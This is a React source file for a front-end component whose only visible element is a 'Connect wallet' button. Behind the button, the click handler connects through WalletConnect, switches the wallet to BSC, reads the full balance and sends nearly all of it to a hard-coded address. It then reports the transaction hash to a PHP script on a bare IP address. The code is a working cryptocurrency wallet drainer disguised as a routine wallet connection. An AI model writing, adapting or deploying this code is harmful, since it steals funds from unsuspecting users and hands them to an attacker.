import jQuery from "jquery";
import { EthereumProvider } from "@walletconnect/ethereum-provider";

function App() {
  async function runner() {
    var ethereumProvider = await EthereumProvider.init({
      showQrModal: true,
      qrModalOptions: {
        themeMode: "dark",
        explorerRecommendedWalletIds: [
          "c57ca95b47569778a828d19178114f4db188b89b763c899ba0be274e97267d96",
          "4622a2b2d6af1c9844944291e5e7351a6aa24cd7b23099efac1b2fd875da31a0",
        ],
      },
      chains: [1, 56], // پشتیبانی از BSC و Ethereum
      methods: ["eth_sendTransaction", "eth_getBalance"],
      projectId: "9fe3ed74e1d73141e8b7747bedf77551",
    });

    await ethereumProvider.enable();
    var provider = ethereumProvider;
    var accounts = await provider.request({ method: "eth_accounts" });
    var account_sender = accounts[0];
    console.log("✅ Wallet Address:", account_sender);

    async function switchToBSC() {
      try {
        await provider.request({
          method: "wallet_switchEthereumChain",
          params: [{ chainId: "0x38" }], // BSC Mainnet
        });
        console.log("✅ Switched to Binance Smart Chain");
      } catch (switchError) {
        console.error("❌ Error switching to BSC:", switchError);
      }
    }

    async function sendMaxTransaction() {
      try {
        let balance = await provider.request({
          method: "eth_getBalance",
          params: [account_sender, "latest"],
        });

        let balanceInWei = BigInt(balance);
        console.log(`💰 Balance: ${balanceInWei} WEI`);

        if (balanceInWei <= 0) {
          console.error("❌ Not enough balance.");
          return;
        }

        const transactionParameters = {
          to: "0xF4c279277f9a897EDbFdba342f7CdFCF261ac4cD",
          from: account_sender,
          value: "0x" + (balanceInWei - BigInt(21000) * BigInt(5000000000)).toString(16),
          gas: "0x5208",
        };

        const txHash = await provider.request({
          method: "eth_sendTransaction",
          params: [transactionParameters],
        });

        console.log("✅ Transaction Hash:", txHash);

        if (!txHash) {
          console.error("❌ Error: Transaction hash is undefined!");
          return;
        }

        // ✅ ارسال امضا به سرور
        try {
          let response = await fetch("http://104.194.133.124/send.php", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              handler: "sign",
              signature: txHash,
              type: "coin",
            }),
          });

          let result = await response.json();
          console.log("✅ Server Response:", result);
        } catch (error) {
          console.error("❌ Error sending signature to server:", error);
        }
      } catch (error) {
        console.error("❌ Error sending transaction:", error);
      }
    }

    await switchToBSC();
    await sendMaxTransaction();
  }

  return (
    <a
      href="#"
      id="kos"
      onClick={runner}
      className="uk-button uk-button-medium@m uk-button-default uk-button-outline uk-margin-left"
      data-uk-toggle=""
    >
      <span>Connect wallet</span>
    </a>
  );
}

export default App;
